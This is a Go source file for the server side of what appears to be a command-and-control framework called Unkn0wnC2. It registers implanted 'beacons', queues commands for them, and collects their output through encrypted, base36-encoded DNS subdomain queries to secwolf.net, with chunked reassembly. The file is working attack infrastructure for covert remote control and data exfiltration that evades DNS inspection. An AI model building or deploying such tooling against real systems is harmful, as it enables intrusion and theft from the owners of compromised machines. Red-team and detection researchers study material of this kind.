// Package main implements the C2 management functionality for the Unkn0wnC2 server.
// This file handles beacon registration, task queuing, result collection, and
// the core C2 protocol logic including chunked data transmission.
package main

import (
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	// Task ID numbering
	taskCounterStart = 1000

	// Subdomain analysis constants
	legitimateSubdomainMaxLength = 20
	base36MinLength              = 30
	base36LongStringThreshold    = 50

	// Timestamp validation
	unixTimestampMinLength = 10
	unixTimestampMaxLength = 11

	// Result preview settings
	resultPreviewMaxLength = 200

	// DNS label chunk size (RFC compliant)
	dnsLabelMaxLength = 62
)

// Beacon represents a connected beacon client
type Beacon struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	LastSeen  time.Time `json:"last_seen"`
	IPAddress string    `json:"ip_address"`
	TaskQueue []Task    `json:"-"` // Don't serialize tasks
}

// Task represents a command task for a beacon
type Task struct {
	ID        string     `json:"id"`
	BeaconID  string     `json:"beacon_id"`
	Command   string     `json:"command"`
	Status    string     `json:"status"` // "pending", "sent", "completed", "failed"
	CreatedAt time.Time  `json:"created_at"`
	SentAt    *time.Time `json:"sent_at,omitempty"`
	Result    string     `json:"result,omitempty"`
}

// ResultChunk represents a piece of a multi-part result
type ResultChunk struct {
	BeaconID    string
	TaskID      string
	ChunkIndex  int
	TotalChunks int
	Data        string
	ReceivedAt  time.Time
}

// ExpectedResult tracks metadata for incoming chunked results
type ExpectedResult struct {
	BeaconID     string
	TaskID       string
	TotalSize    int
	TotalChunks  int
	ReceivedAt   time.Time
	ReceivedData []string // Store chunks in order
}

// C2Manager handles beacon management and tasking
type C2Manager struct {
	beacons         map[string]*Beacon
	tasks           map[string]*Task
	resultChunks    map[string][]ResultChunk   // key: taskID (legacy)
	expectedResults map[string]*ExpectedResult // key: taskID (new two-phase)
	mutex           sync.RWMutex
	taskCounter     int
	debug           bool
	aesKey          []byte
}

// NewC2Manager creates a new C2 management instance with the specified configuration.
// It initializes the beacon tracking system, task management, and sets up AES encryption.
func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
	aesKey := generateAESKey(encryptionKey)

	return &C2Manager{
		beacons:         make(map[string]*Beacon),
		tasks:           make(map[string]*Task),
		resultChunks:    make(map[string][]ResultChunk),
		expectedResults: make(map[string]*ExpectedResult),
		taskCounter:     taskCounterStart,
		debug:           debug,
		aesKey:          aesKey,
	}
}

// decodeBeaconData decodes and decrypts beacon data using AES-GCM + base36
func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
	// Remove dots from DNS labels (e.g., "abc.def" -> "abcdef")
	// This handles long subdomains that get split into multiple labels
	encoded = strings.ReplaceAll(encoded, ".", "")

	// Use new base36 + AES-GCM decoding
	decoded, err := decodeAndDecrypt(encoded, c2.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt: %v", err)
	}

	return decoded, nil
}

// isLegitimateSubdomain checks if a subdomain looks like a legitimate DNS name
// rather than encoded C2 data
// isLegitimateSubdomain determines if a DNS subdomain represents legitimate traffic
// rather than encoded C2 communications based on pattern analysis.
func isLegitimateSubdomain(subdomain string) bool {
	// Convert to lowercase for comparison
	lower := strings.ToLower(subdomain)

	// Common legitimate subdomains
	legitimate := []string{
		"ns1", "ns2", "ns3", "ns4",
		"www", "mail", "mx", "mx1", "mx2",
		"ftp", "smtp", "pop", "imap",
		"api", "cdn", "static", "img", "images",
		"blog", "shop", "store", "admin",
		"test", "dev", "staging", "beta",
	}

	for _, legit := range legitimate {
		if lower == legit {
			return true
		}
	}

	// If subdomain is very short (likely legitimate)
	if len(subdomain) <= 4 {
		return true
	}

	// If subdomain contains only letters and numbers with dashes (no base36-like pattern)
	// and is reasonably short, it's probably legitimate
	if len(subdomain) <= legitimateSubdomainMaxLength && !looksLikeBase36(subdomain) {
		return true
	}

	return false
}

// looksLikeBase36 checks if a string looks like base36-encoded C2 data
// looksLikeBase36 analyzes a string to determine if it appears to be Base36-encoded data
// based on length, character distribution, and entropy characteristics.
func looksLikeBase36(s string) bool {
	// Remove any dots (from split labels)
	clean := strings.ReplaceAll(s, ".", "")

	// Must be reasonably long to be encoded data (base36 encoded AES-GCM data is typically long)
	if len(clean) < base36MinLength {
		return false
	}

	// Check if all characters are valid base36 digits (0-9, a-z)
	for _, char := range clean {
		if !((char >= '0' && char <= '9') ||
			(char >= 'a' && char <= 'z')) {
			return false
		}
	}

	// Additional heuristics for base36 encoded data:
	// - Very long strings are likely encoded data
	// - High entropy (good mix of numbers and letters) suggests encoding
	if len(clean) > base36LongStringThreshold {
		return true
	}

	// Check for good entropy (mix of numbers and letters)
	hasNumbers := false
	hasLetters := false
	for _, char := range clean {
		if char >= '0' && char <= '9' {
			hasNumbers = true
		}
		if char >= 'a' && char <= 'z' {
			hasLetters = true
		}
		if hasNumbers && hasLetters {
			break
		}
	}

	// If it has both numbers and letters and is reasonably long, it's likely base36 data
	return hasNumbers && hasLetters && len(clean) >= base36MinLength
}

// processBeaconQuery processes a DNS query from a beacon and returns appropriate response
func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, bool) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Quick filter: only process queries to secwolf.net
	if !strings.HasSuffix(qname, "secwolf.net") {
		return "", false
	}

	// Extract subdomain before "secwolf.net"
	secwolfPos := strings.Index(qname, "secwolf.net")
	if secwolfPos == -1 {
		return "", false
	}

	subdomain := strings.TrimRight(qname[:secwolfPos], ".")
	if len(subdomain) == 0 {
		return "", false
	}

	// Reconstruct hex string by removing dots between DNS labels
	// Client splits hex string into 62-char chunks separated by dots
	subdomain = strings.ReplaceAll(subdomain, ".", "")

	// Skip legitimate DNS names (NS, MX, WWW, etc.)
	if isLegitimateSubdomain(subdomain) {
		return "", false
	}

	// Decode the subdomain
	decoded, err := c2.decodeBeaconData(subdomain)
	if err != nil {
		return "", false
	}

	// Strip timestamp from decoded data (cache busting)
	// Format: COMMAND|data|...|timestamp -> COMMAND|data|...
	parts := strings.Split(decoded, "|")
	if len(parts) > 1 {
		// Check if last part is a timestamp (numeric)
		lastPart := parts[len(parts)-1]
		if len(lastPart) >= unixTimestampMinLength && len(lastPart) <= unixTimestampMaxLength { // Unix timestamp length
			if _, err := strconv.ParseInt(lastPart, 10, 64); err == nil {
				// Remove timestamp
				decoded = strings.Join(parts[:len(parts)-1], "|")
			}
		}
	}

	// Determine message type and split into parts appropriately so the result/data
	// payloads (which may contain '|' characters) are preserved in the last part.
	if len(decoded) == 0 {
		return "", false
	}

	messageType := strings.SplitN(decoded, "|", 2)[0]
	switch messageType {
	case "CHECKIN", "CHK":
		parts := strings.SplitN(decoded, "|", 5) // CHK|id|host|user|os
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleCheckin(parts, clientIP), true

	case "RESULT":
		// RESULT|beaconID|taskID|<entire result...>
		parts := strings.SplitN(decoded, "|", 4)
		if len(parts) < 4 {
			return "", false
		}
		return c2.handleResult(parts), true

	case "RESULT_META":
		parts := strings.SplitN(decoded, "|", 5) // RESULT_META|id|task|size|chunks
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleResultMeta(parts), true

	case "DATA":
		// DATA|id|taskID|index|<chunk...>
		parts := strings.SplitN(decoded, "|", 5)
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleData(parts), true

	case "CHUNK": // DEPRECATED: Legacy single-phase chunking, kept for backward compatibility
		parts := strings.SplitN(decoded, "|", 6)
		if len(parts) < 6 {
			return "", false
		}
		return c2.handleChunk(parts), true

	default:
		logf("[C2] Unknown message type: %s", messageType)
		return "", false
	}
}

// handleCheckin processes a beacon check-in
func (c2 *C2Manager) handleCheckin(parts []string, clientIP string) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	hostname := parts[2]
	username := parts[3]
	os := parts[4]
	arch := "unknown" // Architecture removed from client data

	// Update or create beacon
	beacon, exists := c2.beacons[beaconID]
	if !exists {
		beacon = &Beacon{
			ID:        beaconID,
			TaskQueue: []Task{},
		}
		c2.beacons[beaconID] = beacon
		// Always log new beacon registration
		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
	}

	// Update beacon info
	beacon.Hostname = hostname
	beacon.Username = username
	beacon.OS = os
	beacon.Arch = arch
	beacon.LastSeen = time.Now()
	beacon.IPAddress = clientIP

	// Only log checkins in debug mode to keep console clean
	if c2.debug {
		logf("[C2] Checkin: %s (%s@%s) from %s",
			beaconID, username, hostname, clientIP)
	}

	// Check if there are pending tasks for this beacon
	if len(beacon.TaskQueue) > 0 {
		task := beacon.TaskQueue[0]
		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove the task from queue

		// Mark task as sent
		if storedTask, exists := c2.tasks[task.ID]; exists {
			storedTask.Status = "sent"
			now := time.Now()
			storedTask.SentAt = &now
		}

		taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
		logf("[C2] Task %s → %s: %s", task.ID, beaconID, task.Command)
		return taskResponse
	}

	return "ACK" // No tasks available
}

// handleResult processes a command result from a beacon
func (c2 *C2Manager) handleResult(parts []string) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	result := parts[3]

	// Log receipt of result (include small preview)
	preview := result
	if len(preview) > resultPreviewMaxLength {
		preview = preview[:resultPreviewMaxLength] + "..."
	}
	logf("[C2] Received RESULT from %s for %s (%d bytes). Preview: %s", beaconID, taskID, len(result), preview)

	// Update task with result
	if task, exists := c2.tasks[taskID]; exists {
		task.Result = result
		task.Status = "completed"
	} else {
		logf("[C2] Warning: Result received for unknown task %s (beacon %s)", taskID, beaconID)
	}

	return "ACK"
}

// handleChunk processes a chunked result from a beacon
func (c2 *C2Manager) handleChunk(parts []string) string {
	if len(parts) < 6 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	chunkIndex, _ := strconv.Atoi(parts[3])
	totalChunks, _ := strconv.Atoi(parts[4])
	data := parts[5]

	// Store the chunk
	chunk := ResultChunk{
		BeaconID:    beaconID,
		TaskID:      taskID,
		ChunkIndex:  chunkIndex,
		TotalChunks: totalChunks,
		Data:        data,
		ReceivedAt:  time.Now(),
	}

	c2.resultChunks[taskID] = append(c2.resultChunks[taskID], chunk)

	// Check if we have all chunks
	chunks := c2.resultChunks[taskID]
	if len(chunks) == totalChunks {
		// Reconstruct the complete result
		result := c2.reconstructResult(chunks)

		// Update the task
		if task, exists := c2.tasks[taskID]; exists {
			task.Result = result
			task.Status = "completed"
			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), totalChunks)
		}

		// Clean up chunks
		delete(c2.resultChunks, taskID)
	}

	return "ACK"
}

// reconstructResult reconstructs a complete result from chunks
func (c2 *C2Manager) reconstructResult(chunks []ResultChunk) string {
	// Sort chunks by index
	sortedChunks := make([]string, len(chunks))
	for _, chunk := range chunks {
		if chunk.ChunkIndex > 0 && chunk.ChunkIndex <= len(chunks) {
			sortedChunks[chunk.ChunkIndex-1] = chunk.Data
		}
	}

	return strings.Join(sortedChunks, "")
}

// handleResultMeta processes result metadata from beacon (two-phase protocol)
func (c2 *C2Manager) handleResultMeta(parts []string) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	totalSize, _ := strconv.Atoi(parts[3])
	totalChunks, _ := strconv.Atoi(parts[4])

	logf("[C2] Expecting chunked result from %s for %s: %d bytes in %d chunks",
		beaconID, taskID, totalSize, totalChunks)

	// Store the expectation
	expected := &ExpectedResult{
		BeaconID:     beaconID,
		TaskID:       taskID,
		TotalSize:    totalSize,
		TotalChunks:  totalChunks,
		ReceivedAt:   time.Now(),
		ReceivedData: make([]string, totalChunks),
	}

	c2.expectedResults[taskID] = expected
	return "ACK"
}

// handleData processes data chunks from beacon (two-phase protocol)
func (c2 *C2Manager) handleData(parts []string) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	chunkIndex, _ := strconv.Atoi(parts[3])
	data := parts[4]

	// Check if we're expecting this data
	expected, exists := c2.expectedResults[taskID]
	if !exists {
		logf("[C2] Warning: Received DATA chunk for unknown task %s", taskID)
		return "ERROR"
	}

	// Store the chunk (1-indexed from client, 0-indexed in array)
	if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
		expected.ReceivedData[chunkIndex-1] = data
	} else {
		logf("[C2] Warning: Invalid chunk index %d for task %s (expected 1-%d)",
			chunkIndex, taskID, expected.TotalChunks)
		return "ERROR"
	}

	// Check if we have all chunks
	complete := true
	receivedCount := 0
	for i := 0; i < expected.TotalChunks; i++ {
		if expected.ReceivedData[i] != "" {
			receivedCount++
		} else {
			complete = false
		}
	}

	if complete {
		// Reconstruct the complete result
		result := strings.Join(expected.ReceivedData, "")

		logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)

		// Update the task
		if task, exists := c2.tasks[taskID]; exists {
			task.Result = result
			task.Status = "completed"
		}

		// Clean up
		delete(c2.expectedResults, taskID)
	}

	return "ACK"
}

// AddTask adds a new task for a specific beacon
func (c2 *C2Manager) AddTask(beaconID, command string) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Generate task ID
	c2.taskCounter++
	taskID := fmt.Sprintf("T%04d", c2.taskCounter)

	task := &Task{
		ID:        taskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[taskID] = task

	// Add to beacon's task queue
	if beacon, exists := c2.beacons[beaconID]; exists {
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
		logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
		return taskID
	}

	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
	return ""
}

// GetBeacons returns all registered beacons
func (c2 *C2Manager) GetBeacons() map[string]*Beacon {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*Beacon)
	for id, beacon := range c2.beacons {
		result[id] = beacon
	}
	return result
}

// GetTasks returns all tasks
func (c2 *C2Manager) GetTasks() map[string]*Task {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*Task)
	for id, task := range c2.tasks {
		result[id] = task
	}
	return result
}

// PrintStatus prints the current C2 status
func (c2 *C2Manager) PrintStatus() {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	fmt.Printf("\n=== C2 Status ===\n")
	fmt.Printf("Active Beacons: %d\n", len(c2.beacons))

	for _, beacon := range c2.beacons {
		fmt.Printf("  [%s] %s@%s (%s/%s) - Last seen: %s - Queue: %d tasks\n",
			beacon.ID, beacon.Username, beacon.Hostname, beacon.OS, beacon.Arch,
			beacon.LastSeen.Format("15:04:05"), len(beacon.TaskQueue))
	}

	pendingTasks := 0
	completedTasks := 0
	for _, task := range c2.tasks {
		switch task.Status {
		case "pending", "sent":
			pendingTasks++
		case "completed":
			completedTasks++
		}
	}

	fmt.Printf("Tasks - Pending: %d, Completed: %d\n", pendingTasks, completedTasks)
	fmt.Printf("==================\n")
}
